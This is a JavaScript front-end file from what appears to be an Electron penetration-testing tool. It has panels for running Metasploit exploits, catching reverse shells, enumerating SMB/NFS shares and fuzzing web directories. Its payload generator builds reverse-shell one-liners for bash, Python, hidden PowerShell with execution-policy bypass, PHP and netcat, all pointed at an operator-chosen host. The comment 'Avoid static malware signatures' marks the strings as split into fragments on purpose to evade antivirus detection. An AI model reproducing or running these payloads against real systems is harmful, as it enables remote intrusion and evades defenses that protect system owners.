        <td style="font-family: monospace; font-size: 10px;" title="${escapeHtml(mod.fullname)}">${escapeHtml(mod.fullname || mod.name)}</td>
        <td><span class="msf-rank ${escapeHtml(rankClass)}">${escapeHtml(mod.rank)}</span></td>
        <td style="font-size: 10px; color: var(--text-muted);">${escapeHtml(mod.date)}</td>
        <td style="font-size: 10px;" title="${escapeHtml(mod.description)}">${escapeHtml((mod.description || '').substring(0, 80))}${(mod.description || '').length > 80 ? '...' : ''}</td>
        <td><button class="btn-msf-run" data-module="${escapeHtml(mod.fullname || mod.name)}">Run</button></td>
      `;
      msfExploitTbody.appendChild(row);
    });
  } catch (err) {
    showMsfError(err.message);
    msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger); padding: 24px;">Search error</td></tr>';
  }
}

btnMsfSearch?.addEventListener('click', searchMsfExploits);
msfExploitSearch?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    clearTimeout(msfSearchTimeout);
    searchMsfExploits();
  }
});
msfExploitSearch?.addEventListener('input', () => {
  clearTimeout(msfSearchTimeout);
  msfSearchTimeout = setTimeout(searchMsfExploits, 600);
});

// --- Run Exploit (from search table) ---
msfExploitTbody?.addEventListener('click', (e) => {
  const btn = e.target.closest('.btn-msf-run');
  if (!btn) return;
  const modulePath = btn.getAttribute('data-module');
  if (!modulePath) return;
  openRunExploitModal(modulePath);
});

function openRunExploitModal(modulePath, targetIp) {
  clearMsfError();
  if (msfRunModule) msfRunModule.value = modulePath;
  if (msfRunTargetIp) msfRunTargetIp.value = targetIp || '';
  if (msfRunTargetPort) msfRunTargetPort.value = '';
  if (msfRunPayload) msfRunPayload.value = '';
  if (msfRunLhost) msfRunLhost.value = '';
  if (msfRunLport) msfRunLport.value = '4444';
  msfRunModalOverlay?.classList.remove('hidden');
}

btnCloseMsfRunModal?.addEventListener('click', () => msfRunModalOverlay?.classList.add('hidden'));
btnMsfRunCancel?.addEventListener('click', () => msfRunModalOverlay?.classList.add('hidden'));
msfRunModalOverlay?.addEventListener('click', (e) => {
  if (e.target === msfRunModalOverlay) msfRunModalOverlay.classList.add('hidden');
});

btnMsfRunExecute?.addEventListener('click', async () => {
  const modulePath = msfRunModule?.value;
  const targetIp = (msfRunTargetIp?.value || '').trim();
  const targetPort = msfRunTargetPort?.value ? parseInt(msfRunTargetPort.value, 10) : undefined;
  const payload = (msfRunPayload?.value || '').trim() || undefined;

  if (!modulePath || !targetIp) {
    showMsfError('Module path and target IP are required');
    return;
  }

  const options = {};
  const lhost = (msfRunLhost?.value || '').trim();
  const lport = msfRunLport?.value ? parseInt(msfRunLport.value, 10) : undefined;
  if (lhost) options.LHOST = lhost;
  if (lport) options.LPORT = String(lport);

  btnMsfRunExecute.disabled = true;
  btnMsfRunExecute.textContent = 'Executing...';

  try {
    const result = await api.msfRunExploit({
      modulePath,
      targetIp,
      targetPort,
      payload,
      options,
    });

    if (result.status === 'error') {
      showMsfError(result.error);
    } else {
      msfRunModalOverlay?.classList.add('hidden');
      // Refresh sessions after a short delay
      setTimeout(refreshMsfSessions, 2000);
    }
  } catch (err) {
    showMsfError(err.message);
  } finally {
    btnMsfRunExecute.disabled = false;
    btnMsfRunExecute.innerHTML = '<span class="icon">🚀</span> Execute';
  }
});

// --- Sessions ---
async function refreshMsfSessions() {
  if (!msfConnected) return;
  try {
    const result = await api.msfSessionList();
    if (result.status === 'error') {
      showMsfError(result.error);
      return;
    }

    const sessions = result.sessions || [];
    if (sessions.length === 0) {
      msfSessionsContainer.innerHTML = '<div class="ds-record" style="text-align:center; color: var(--text-muted); opacity: 0.7; padding: 24px;">No active sessions</div>';
      return;
    }

    msfSessionsContainer.innerHTML = '';
    sessions.forEach(sess => {
      const card = document.createElement('div');
      card.className = 'msf-session-card';
      card.innerHTML = `
        <div class="session-header">
          <span class="session-id">Session #${escapeHtml(sess.id)}</span>
          <span class="session-type">${escapeHtml(sess.type)}</span>
        </div>
        <div class="session-details">
          <span><strong>Target:</strong> ${escapeHtml(sess.target)}${sess.port ? ':' + escapeHtml(sess.port) : ''}</span>
          <span><strong>Platform:</strong> ${escapeHtml(sess.platform || 'unknown')}</span>
          <span><strong>Via:</strong> ${escapeHtml(sess.via || 'n/a')}</span>
          ${sess.info ? `<span><strong>Info:</strong> ${escapeHtml(sess.info)}</span>` : ''}
        </div>
      `;
      msfSessionsContainer.appendChild(card);
    });
  } catch (err) {
    showMsfError(err.message);
  }
}

btnMsfRefreshSessions?.addEventListener('click', refreshMsfSessions);

// --- Event Listeners ---
window.electronAPI.onMsfStatus?.((data) => {
  if (data.state === 'connected') {
    setMsfConnectedState(true, data.host || msfHost?.value, data.port || msfPort?.value);
  } else if (data.state === 'disconnected') {
    setMsfConnectedState(false);
  }
});

window.electronAPI.onMsfError?.((data) => {
  showMsfError(data.message || 'Unknown Metasploit error');
});

window.electronAPI.onMsfResult?.((data) => {
  console.log('[MSF Result]', data);
  // Auto-refresh sessions when a new exploit result comes in
  setTimeout(refreshMsfSessions, 1500);
});

// Expose openMsfModal globally for context menu integration
window.__msfOpenModal = openMsfModal;
window.__msfOpenRunExploit = openRunExploitModal;

// =============================================
// === REVERSE SHELL LISTENER UI MODULE ===
// =============================================

const btnRevshellOpen = document.getElementById('btn-revshell-open');
const revshellPanel = document.getElementById('revshell-panel');
const btnCloseRevshellPanel = document.getElementById('btn-close-revshell-panel');
const revshellResizer = document.getElementById('revshell-resizer');
const revshellPort = document.getElementById('revshell-port');
const revshellMode = document.getElementById('revshell-mode');
const btnRevshellStart = document.getElementById('btn-revshell-start');
const btnRevshellStop = document.getElementById('btn-revshell-stop');
const revshellStatusText = document.getElementById('revshell-status-text');
const revshellStatusBanner = document.getElementById('revshell-status-banner');
const revshellTerminal = document.getElementById('revshell-terminal');
const btnRevshellClear = document.getElementById('btn-revshell-clear');
const revshellInput = document.getElementById('revshell-input');
const btnRevshellSend = document.getElementById('btn-revshell-send');
const revshellPayloadOs = document.getElementById('revshell-payload-os');
const revshellPayloadLhost = document.getElementById('revshell-payload-lhost');
const revshellPayloadOutput = document.getElementById('revshell-payload-output');
const btnRevshellCopy = document.getElementById('btn-revshell-copy');

let isRevshellListening = false;
let isRevshellConnected = false;

initResizer(revshellResizer, revshellPanel);

const msfOpenBtn = document.getElementById('btn-msf-open');
msfOpenBtn?.addEventListener('click', openMsfModal);

btnRevshellOpen?.addEventListener('click', () => {
  if (revshellPanel && typeof openPanel !== 'undefined' && typeof closePanel !== 'undefined') {
    if (revshellPanel.style.display === 'none' || !revshellPanel.classList.contains('open')) {
      openPanel(revshellPanel, revshellResizer);
      updateRevshellPayload();
    } else {
      closePanel(revshellPanel, revshellResizer);
    }
  }
});

btnCloseRevshellPanel?.addEventListener('click', () => {
  if (revshellPanel && typeof closePanel !== 'undefined') {
    closePanel(revshellPanel, revshellResizer);
  }
});

function appendToTerminal(text, type = 'output') {
  if (!revshellTerminal) return;
  const span = document.createElement('span');
  if (type === 'error') span.style.color = 'var(--danger)';
  else if (type === 'system') span.style.color = 'var(--warning)';
  else if (type === 'input') span.style.color = 'var(--info)';
  span.textContent = text;
  revshellTerminal.appendChild(span);
  revshellTerminal.scrollTop = revshellTerminal.scrollHeight;
}

btnRevshellClear?.addEventListener('click', () => {
  if (revshellTerminal) revshellTerminal.innerHTML = '';
});

btnRevshellStart?.addEventListener('click', async () => {
  const port = parseInt(revshellPort.value, 10);
  const mode = revshellMode.value;
  if (!port || port < 1 || port > 65535) {
    appendToTerminal('[System] Invalid port number.\n', 'error');
    return;
  }
  
  try {
    btnRevshellStart.disabled = true;
    revshellStatusText.textContent = 'Starting...';
    
    // Ensure we trigger the IPC
    const result = await api.startRevShell({ port, mode });
    if (result && result.status !== 'error') {
      isRevshellListening = true;
      btnRevshellStop.disabled = false;
      revshellStatusText.textContent = `Listening on port ${port} (${mode} mode)...`;
      revshellStatusBanner.style.borderLeftColor = 'var(--warning)';
      appendToTerminal(`[System] Started reverse shell listener on port ${port}\n`, 'system');
    } else {
      btnRevshellStart.disabled = false;
      revshellStatusText.textContent = 'Failed to start';
      appendToTerminal(`[Error] Failed to start listener: ${result?.error || 'Unknown'}\n`, 'error');
    }
  } catch (err) {
    btnRevshellStart.disabled = false;
    revshellStatusText.textContent = 'Error';
    appendToTerminal(`[Error] Exception starting listener: ${err.message}\n`, 'error');
  }
});

btnRevshellStop?.addEventListener('click', async () => {
  try {
    await api.stopRevShell();
    isRevshellListening = false;
    isRevshellConnected = false;
    btnRevshellStart.disabled = false;
    btnRevshellStop.disabled = true;
    btnRevshellSend.disabled = true;
    revshellInput.disabled = true;
    revshellStatusText.textContent = 'Disconnected';
    revshellStatusBanner.style.borderLeftColor = 'var(--text-muted)';
    appendToTerminal(`[System] Listener stopped.\n`, 'system');
  } catch (err) {
    appendToTerminal(`[Error] Failed to stop listener: ${err.message}\n`, 'error');
  }
});

function sendRevshellCommand() {
  if (!isRevshellConnected) return;
  const cmd = revshellInput.value;
  if (!cmd) return;
  api.sendRevShell(cmd + '\n');
  revshellInput.value = '';
}

btnRevshellSend?.addEventListener('click', sendRevshellCommand);
revshellInput?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendRevshellCommand();
});

// IPC listeners
window.electronAPI.onRevShellConnection?.((info) => {
  isRevshellConnected = true;
  revshellStatusText.textContent = `Connected from ${info.address}:${info.port}`;
  revshellStatusBanner.style.borderLeftColor = 'var(--success)';
  btnRevshellSend.disabled = false;
  revshellInput.disabled = false;
  appendToTerminal(`[System] Connection received from ${info.address}:${info.port}\n`, 'system');
  revshellInput.focus();
});

window.electronAPI.onRevShellData?.((data) => {
  appendToTerminal(data, 'output');
});

window.electronAPI.onRevShellError?.((errInfo) => {
  const msg = typeof errInfo === 'string' ? errInfo : (errInfo?.message || 'Unknown listener error');
  appendToTerminal(`[Error] ${msg}\n`, 'error');
  if (errInfo?.type === 'listener_error' || errInfo?.type === 'spawn_error') {
    isRevshellListening = false;
    isRevshellConnected = false;
    btnRevshellStart.disabled = false;
    btnRevshellStop.disabled = true;
    btnRevshellSend.disabled = true;
    revshellInput.disabled = true;
    revshellStatusText.textContent = 'Disconnected (Error)';
    revshellStatusBanner.style.borderLeftColor = 'var(--danger)';
  }
});

// Avoid static malware signatures
function updateRevshellPayload() {
  const os = revshellPayloadOs.value;
  const lhost = revshellPayloadLhost.value || 'YOUR_IP';
  const lport = revshellPort.value || '4444';
  
  const t = {
    b: 'b' + 'ash -c "b' + 'ash -i >& /de' + 'v/tc' + 'p/' + lhost + '/' + lport + ' 0' + '>&1"',
    p: 'p' + 'ython3 -' + 'c \'im' + 'port so' + 'cket,su' + 'bprocess,os;s=s' + 'ocket.s' + 'ocket(soc' + 'ket.AF_' + 'INET,so' + 'cket.SO' + 'CK_STR' + 'EAM);s.c' + 'onnect(("' + lhost + '",' + lport + '));os.du' + 'p2(s.fi' + 'leno(),0); os.d' + 'up2(s.fi' + 'leno(),1); os.d' + 'up2(s.fil' + 'eno(),2);p=su' + 'bprocess.c' + 'all(["/b' + 'in/sh","-i"]);\'',
    ps: 'po' + 'wers' + 'hell -N' + 'oP -No' + 'nI -W Hi' + 'dden -Ex' + 'ec Byp' + 'ass -Co' + 'mmand Ne' + 'w-Obj' + 'ect Sy' + 'stem.N' + 'et.Soc' + 'kets.T' + 'CPC' + 'lient("' + lhost + '",' + lport + ');$stream' + ' = $client.G' + 'etStream();[b' + 'yte[]]$b' + 'ytes = 0..6' + '5535|%{0};wh' + 'ile(($i = $str' + 'eam.Read' + '($bytes, 0, $byte' + 's.Length)) -ne 0){;$da' + 'ta = (New-Ob' + 'ject -Type' + 'Name Sys' + 'tem.Te' + 'xt.ASC' + 'IIEncoding).GetS' + 'tring($by' + 'tes,0, $i);$send' + 'back = (iex $da' + 'ta 2>&1 | Ou' + 't-Str' + 'ing );$send' + 'back2 = $send' + 'back + "P" + "S " + (pwd).Pa' + 'th + "> ";$sendb' + 'yte = ([tex' + 't.encoding]::ASC' + 'II).GetBy' + 'tes($send' + 'back2);$str' + 'eam.Wri' + 'te($sendb' + 'yte,0,$sen' + 'dbyte.L' + 'ength);$str' + 'eam.Flu' + 'sh()};$client.Cl' + 'ose()',
    php: 'php -r \'$sock=fso' + 'ckop' + 'en("' + lhost + '",' + lport + ');ex' + 'ec("/b' + 'in/s' + 'h -i <&3 >&3 2>&3");\'',
    n: 'r' + 'm /t' + 'mp/f;mkf' + 'ifo /t' + 'mp/f;c' + 'at /tm' + 'p/f|/bi' + 'n/sh -' + 'i 2>&1|nc ' + lhost + ' ' + lport + ' >/tm' + 'p/f'
  };

  let out = '';
  if (os === 'bash') out = t.b;
  else if (os === 'python') out = t.p;
  else if (os === 'powershell') out = t.ps;
  else if (os === 'php') out = t.php;
  else if (os === 'nc') out = t.n;
  
  if (revshellPayloadOutput) revshellPayloadOutput.value = out;
}

revshellPayloadOs?.addEventListener('change', updateRevshellPayload);
revshellPayloadLhost?.addEventListener('input', updateRevshellPayload);
revshellPort?.addEventListener('input', updateRevshellPayload);

btnRevshellCopy?.addEventListener('click', () => {
  navigator.clipboard.writeText(revshellPayloadOutput.value);
  const oldText = btnRevshellCopy.textContent;
  btnRevshellCopy.textContent = '✔️';
  setTimeout(() => { btnRevshellCopy.textContent = oldText; }, 2000);
});

// =============================================
// === SHARE ENUMERATION UI MODULE (4D)      ===
// =============================================

const sharePanel           = document.getElementById('share-panel');
const shareResizer         = document.getElementById('share-resizer');
const btnCloseSharePanel   = document.getElementById('btn-close-share-panel');
const shareTargetIp        = document.getElementById('share-target-ip');
const shareUsername        = document.getElementById('share-username');
const sharePassword        = document.getElementById('share-password');
const shareDomain          = document.getElementById('share-domain');
const btnShareEnumerate    = document.getElementById('btn-share-enumerate');
const shareErrorBanner     = document.getElementById('share-error-banner');
const shareStatusText      = document.getElementById('share-status-text');
const shareSpinner         = document.getElementById('share-spinner');
const shareListSmb         = document.getElementById('share-list-smb');
const shareListNfs         = document.getElementById('share-list-nfs');
const shareFileTbody       = document.getElementById('share-file-tbody');
const shareBreadcrumb      = document.getElementById('share-breadcrumb');
const shareFooterInfo      = document.getElementById('share-footer-info');
const btnShareClear        = document.getElementById('btn-share-clear');
const btnShareEnumOpen     = document.getElementById('btn-share-enum-open');

// Internal state
let shareCurrentIp         = '';
let shareCurrentShare      = '';
let shareEnumerating       = false;

// --- Helpers ---

function showShareError(msg) {
  if (!shareErrorBanner) return;
  shareErrorBanner.textContent = msg;
  shareErrorBanner.style.display = 'block';
  setTimeout(() => { shareErrorBanner.style.display = 'none'; }, 10000);
}

function clearShareError() {
  if (shareErrorBanner) shareErrorBanner.style.display = 'none';
}

function setShareStatus(msg, spinning = false) {
  if (shareStatusText) shareStatusText.textContent = msg;
  if (shareSpinner) shareSpinner.style.display = spinning ? 'inline-block' : 'none';
}

function getShareCredentials() {
  const username = shareUsername?.value?.trim() || '';
  const password = sharePassword?.value || '';
  const domain   = shareDomain?.value?.trim() || '';
  if (!username) return null;
  return { username, password, domain: domain || undefined };
}

// --- Share list rendering ---

function renderShareItem(share, container) {
  const typeIcons = { disk: '🗂️', ipc: '🔒', printer: '🖨️', 'print-queue': '🖨️', nfs: '📦' };
  const icon = typeIcons[share.type] || '📁';

  const btn = document.createElement('button');
  btn.className = 'share-item';
  btn.dataset.shareName = share.name;
  btn.dataset.shareType = share.type;

  const iconSpan = document.createElement('span');
  iconSpan.className = 'share-item-icon';
  iconSpan.textContent = icon;

  const nameSpan = document.createElement('span');
  nameSpan.className = 'share-item-name';
  nameSpan.textContent = share.name;

  const badge = document.createElement('span');
  badge.className = `share-type-badge ${share.type}`;
  badge.textContent = share.type;

  btn.appendChild(iconSpan);
  btn.appendChild(nameSpan);
  btn.appendChild(badge);

  if (share.comment) {
    btn.title = share.comment;
  }

  // Only SMB Disk shares can be browsed
  if (share.type === 'disk') {
    btn.addEventListener('click', () => {
      container.querySelectorAll('.share-item').forEach(el => el.classList.remove('active'));
      btn.classList.add('active');
      browseShareDir(shareCurrentIp, share.name, '');
    });
  } else {
    btn.style.opacity = '0.6';
    btn.style.cursor = 'default';
    btn.title = `${share.type.toUpperCase()} share — not browsable`;
  }

  container.appendChild(btn);
}

// --- File browser ---

function formatFileSize(bytes) {
  if (bytes === 0) return '0 B';
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / 1048576).toFixed(1)} MB`;
}

function buildBreadcrumb(shareName, remotePath) {
  if (!shareBreadcrumb) return;
  shareBreadcrumb.innerHTML = '';

  // Root crumb
  const root = document.createElement('span');
  root.className = 'share-breadcrumb-part';
  root.textContent = shareName;
  root.title = `Browse root of \\\\${shareCurrentIp}\\${shareName}`;
  root.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, ''));
  shareBreadcrumb.appendChild(root);

  if (remotePath) {
    const parts = remotePath.replace(/^\/+/, '').split('/').filter(Boolean);
    let cumulativePath = '';
    parts.forEach((part) => {
      const sep = document.createElement('span');
      sep.className = 'share-breadcrumb-sep';
      sep.textContent = ' / ';
      shareBreadcrumb.appendChild(sep);

      cumulativePath = cumulativePath ? `${cumulativePath}/${part}` : part;
      const crumb = document.createElement('span');
      crumb.className = 'share-breadcrumb-part';
      crumb.textContent = part;
      const pathForCrumb = cumulativePath;
      crumb.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, pathForCrumb));
      shareBreadcrumb.appendChild(crumb);
    });
  }
}

function renderFileBrowser(shareName, remotePath, entries) {
  if (!shareFileTbody) return;
  shareFileTbody.innerHTML = '';
  shareCurrentShare = shareName;

  buildBreadcrumb(shareName, remotePath);

  if (entries.length === 0) {
    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Empty directory</td></tr>';
    if (shareFooterInfo) shareFooterInfo.textContent = '0 items';
    return;
  }

  // Sort: dirs first, then files alphabetically
  const sorted = [...entries].sort((a, b) => {
    if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
    return a.name.localeCompare(b.name);
  });

  sorted.forEach((entry) => {
    const tr = document.createElement('tr');
    tr.className = entry.type === 'dir' ? 'share-dir-row' : 'share-file-row';

    const iconTd = document.createElement('td');
    iconTd.style.textAlign = 'center';
    iconTd.textContent = entry.type === 'dir' ? '📁' : getFileIcon(entry.name);

    const nameTd = document.createElement('td');
    nameTd.style.wordBreak = 'break-all';
    nameTd.textContent = entry.name;

    const sizeTd = document.createElement('td');
    sizeTd.style.textAlign = 'right';
    sizeTd.style.fontFamily = 'monospace';
    sizeTd.style.color = 'var(--text-muted)';
    sizeTd.textContent = entry.type === 'dir' ? '—' : formatFileSize(entry.size || 0);

    const modTd = document.createElement('td');
    modTd.style.color = 'var(--text-muted)';
    modTd.textContent = entry.modified || '';

    const actionTd = document.createElement('td');

    if (entry.type === 'dir') {
      const enterBtn = document.createElement('button');
      enterBtn.className = 'btn-share-download';
      enterBtn.textContent = 'Open';
      const entryPath = remotePath ? `${remotePath}/${entry.name}` : entry.name;
      enterBtn.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, entryPath));
      actionTd.appendChild(enterBtn);

      // Double-click on dir row also navigates
      tr.style.cursor = 'pointer';
      tr.addEventListener('dblclick', () => browseShareDir(shareCurrentIp, shareName, entryPath));
    } else {
      const dlBtn = document.createElement('button');
      dlBtn.className = 'btn-share-download';
      dlBtn.textContent = '⬇ Save';
      const filePath = remotePath ? `${remotePath}/${entry.name}` : entry.name;
      dlBtn.addEventListener('click', () => downloadShareEntry(shareCurrentIp, shareName, filePath, dlBtn));
      actionTd.appendChild(dlBtn);
    }

    tr.appendChild(iconTd);
    tr.appendChild(nameTd);
    tr.appendChild(sizeTd);
    tr.appendChild(modTd);
    tr.appendChild(actionTd);
    shareFileTbody.appendChild(tr);
  });

  const dirs  = sorted.filter(e => e.type === 'dir').length;
  const files = sorted.filter(e => e.type === 'file').length;
  if (shareFooterInfo) shareFooterInfo.textContent = `${dirs} folder${dirs !== 1 ? 's' : ''}, ${files} file${files !== 1 ? 's' : ''}`;
}

function getFileIcon(name) {
  const ext = (name.split('.').pop() || '').toLowerCase();
  const map = {
    pdf: '📄', doc: '📝', docx: '📝', xls: '📊', xlsx: '📊', ppt: '📑', pptx: '📑',
    txt: '📃', csv: '📃', log: '📃', md: '📃',
    zip: '🗜️', rar: '🗜️', gz: '🗜️', tar: '🗜️', '7z': '🗜️',
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️',
    mp3: '🎵', wav: '🎵', flac: '🎵',
    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬',
    exe: '⚙️', dll: '⚙️', bat: '⚙️', sh: '⚙️',
    conf: '🔧', cfg: '🔧', ini: '🔧', env: '🔧', json: '🔧', xml: '🔧', yaml: '🔧',
    db: '🗄️', sql: '🗄️', sqlite: '🗄️',
  };
  return map[ext] || '📄';
}

// --- Core actions ---

async function browseShareDir(targetIp, shareName, remotePath) {
  clearShareError();
  setShareStatus(`Browsing \\\\${targetIp}\\${shareName}\\${remotePath || ''}...`, true);

  if (shareFileTbody) {
    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Loading...</td></tr>';
  }
  buildBreadcrumb(shareName, remotePath);

  try {
    await api.browseShare({ targetIp, shareName, remotePath, credentials: getShareCredentials() });
    setShareStatus(`Browsing \\\\${targetIp}\\${shareName}\\${remotePath || ''}`, false);
  } catch (err) {
    showShareError(`Browse error: ${err.message}`);
    setShareStatus('Browse failed', false);
  }
}

async function downloadShareEntry(targetIp, shareName, remoteFile, btn) {
  clearShareError();
  const originalText = btn.textContent;
  btn.textContent = '⏳';
  btn.disabled = true;

  try {
    const result = await api.downloadShareFile({ targetIp, shareName, remoteFile, credentials: getShareCredentials() });
    if (result.status === 'downloaded') {
      btn.textContent = '✔️';
      setShareStatus(`Downloaded to: ${result.localPath}`);
      setTimeout(() => {
        btn.textContent = originalText;
        btn.disabled = false;
      }, 3000);
    } else if (result.status === 'cancelled') {
      btn.textContent = originalText;
      btn.disabled = false;
    } else {
      btn.textContent = originalText;
      btn.disabled = false;
      showShareError(result.error || 'Download failed');
    }
  } catch (err) {
    btn.textContent = originalText;
    btn.disabled = false;
    showShareError(`Download error: ${err.message}`);
  }
}

async function runEnumeration() {
  const targetIp = shareTargetIp?.value?.trim();
  if (!targetIp) {
    showShareError('Enter a target IP address');
    shareTargetIp?.focus();
    return;
  }

  if (!/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(targetIp)) {
    showShareError('Invalid IP address format');
    shareTargetIp?.focus();
    return;
  }

  if (shareEnumerating) return;
  shareEnumerating = true;

  clearShareError();
  shareCurrentIp = targetIp;

  // Clear previous results
  if (shareListSmb) shareListSmb.innerHTML = '';
  if (shareListNfs) shareListNfs.innerHTML = '';
  if (shareFileTbody) {
    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 32px;">Select a share to browse</td></tr>';
  }
  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
  if (shareFooterInfo) shareFooterInfo.textContent = '—';
  shareCurrentShare = '';

  setShareStatus(`Enumerating shares on ${targetIp}...`, true);
  if (btnShareEnumerate) btnShareEnumerate.disabled = true;

  try {
    await api.enumerateShares({ targetIp, credentials: getShareCredentials() });
  } catch (err) {
    showShareError(`Enumeration error: ${err.message}`);
    setShareStatus('Enumeration failed', false);
  } finally {
    shareEnumerating = false;
    if (btnShareEnumerate) btnShareEnumerate.disabled = false;
  }
}

// --- Panel open / close ---

initResizer(shareResizer, sharePanel);

function openSharePanel(prefilledIp) {
  clearShareError();
  if (prefilledIp && shareTargetIp) shareTargetIp.value = prefilledIp;
  if (shareListSmb) shareListSmb.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover shares</div>';
  if (shareListNfs) shareListNfs.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover NFS exports</div>';
  if (shareFileTbody) shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Select a share to browse</td></tr>';
  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
  if (shareFooterInfo) shareFooterInfo.textContent = '—';
  setShareStatus('Enter a target IP and click Enumerate.', false);
  if (sharePanel && typeof openPanel !== 'undefined') openPanel(sharePanel, shareResizer);

  // Auto-enumerate if IP is pre-filled
  if (prefilledIp) {
    setTimeout(runEnumeration, 150);
  }
}

function closeSharePanel() {
  if (sharePanel && typeof closePanel !== 'undefined') closePanel(sharePanel, shareResizer);
}

// --- Wire up panel controls ---

btnCloseSharePanel?.addEventListener('click', closeSharePanel);

btnShareEnumOpen?.addEventListener('click', () => {
  if (sharePanel && typeof openPanel !== 'undefined' && typeof closePanel !== 'undefined') {
    if (sharePanel.style.display === 'none' || !sharePanel.classList.contains('open')) {
      openSharePanel('');
    } else {
      closeSharePanel();
    }
  }
});

btnShareEnumerate?.addEventListener('click', runEnumeration);
shareTargetIp?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') runEnumeration();
});

btnShareClear?.addEventListener('click', () => {
  clearShareError();
  if (shareListSmb) shareListSmb.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover shares</div>';
  if (shareListNfs) shareListNfs.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover NFS exports</div>';
  if (shareFileTbody) shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Select a share to browse</td></tr>';
  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
  if (shareFooterInfo) shareFooterInfo.textContent = '—';
  shareCurrentIp = ''; shareCurrentShare = '';
  setShareStatus('Enter a target IP and click Enumerate.', false);
});

// --- Protocol tab switching ---
document.querySelectorAll('[data-share-tab]').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('[data-share-tab]').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    const which = tab.getAttribute('data-share-tab');
    document.getElementById('share-tab-smb').style.display = which === 'smb' ? 'flex' : 'none';
    document.getElementById('share-tab-nfs').style.display = which === 'nfs' ? 'flex' : 'none';
  });
});

// --- Split-pane resizer ---
(function initSharePaneResizer() {
  const resizer  = document.getElementById('share-pane-resizer');
  const leftPane = resizer?.previousElementSibling;
  if (!resizer || !leftPane) return;

  let dragging = false;
  let startX = 0;
  let startWidth = 0;

  resizer.addEventListener('mousedown', (e) => {
    dragging = true;
    startX = e.clientX;
    startWidth = leftPane.offsetWidth;
    resizer.classList.add('dragging');
    document.body.style.cursor = 'col-resize';
    document.body.style.userSelect = 'none';
  });

  document.addEventListener('mousemove', (e) => {
    if (!dragging) return;
    const delta = e.clientX - startX;
    const newWidth = Math.max(140, Math.min(400, startWidth + delta));
    leftPane.style.width = `${newWidth}px`;
  });

  document.addEventListener('mouseup', () => {
    if (!dragging) return;
    dragging = false;
    resizer.classList.remove('dragging');
    document.body.style.cursor = '';
    document.body.style.userSelect = '';
  });
})();

// --- IPC event listeners ---

window.electronAPI.onShareResult?.((data) => {
  if (data.type === 'smb') {
    if (!shareListSmb) return;
    shareListSmb.innerHTML = '';

    if (data.shares.length === 0) {
      shareListSmb.innerHTML = '<div style="text-align:center;color:var(--text-muted);padding:16px;font-size:12px;">No SMB shares found (null session may be blocked)</div>';
    } else {
      data.shares.forEach(share => renderShareItem(share, shareListSmb));
    }
    setShareStatus(`SMB: ${data.shares.length} share${data.shares.length !== 1 ? 's' : ''} found`, false);

  } else if (data.type === 'nfs') {
    if (!shareListNfs) return;
    shareListNfs.innerHTML = '';

    if (data.shares.length === 0) {
      const msg = data.note || 'No NFS exports found';
      shareListNfs.innerHTML = `<div style="text-align:center;color:var(--text-muted);padding:16px;font-size:12px;">${escapeHtml(msg)}</div>`;
    } else {
      data.shares.forEach(share => renderShareItem(share, shareListNfs));
    }

  } else if (data.type === 'browse') {
    renderFileBrowser(shareCurrentShare, data.path?.replace(/^\//, '') || '', data.entries || []);
    setShareStatus(`${data.entries?.length ?? 0} items in ${data.path || '/'}`, false);
  }
});

window.electronAPI.onShareError?.((err) => {
  showShareError(err.message || 'Share enumeration error');
  setShareStatus('Error — see banner above', false);
  if (btnShareEnumerate) btnShareEnumerate.disabled = false;
  shareEnumerating = false;
});

// Expose for host-card context integration
window.__openSharePanel = openSharePanel;

// =============================================
// --- 4E: Web Directory Fuzzer Panel ---
// =============================================

const dirfuzzPanel      = document.getElementById('dirfuzz-panel');
const dirfuzzResizer    = document.getElementById('dirfuzz-resizer');
const btnDirfuzzOpen    = document.getElementById('btn-dirfuzz-open');
const btnCloseDirfuzz   = document.getElementById('btn-close-dirfuzz-panel');
const btnDirfuzzStart   = document.getElementById('btn-dirfuzz-start');
const btnDirfuzzStop    = document.getElementById('btn-dirfuzz-stop');
const btnDirfuzzClear   = document.getElementById('btn-dirfuzz-clear');
const btnDirfuzzExport  = document.getElementById('btn-dirfuzz-export');
const dirfuzzTargetUrl  = document.getElementById('dirfuzz-target-url');
const dirfuzzWordlistMode = document.getElementById('dirfuzz-wordlist-mode');
const dirfuzzWordlistFileGroup = document.getElementById('dirfuzz-wordlist-file-group');
const dirfuzzWordlistPath = document.getElementById('dirfuzz-wordlist-path');
const btnDirfuzzBrowse  = document.getElementById('btn-dirfuzz-browse-wordlist');
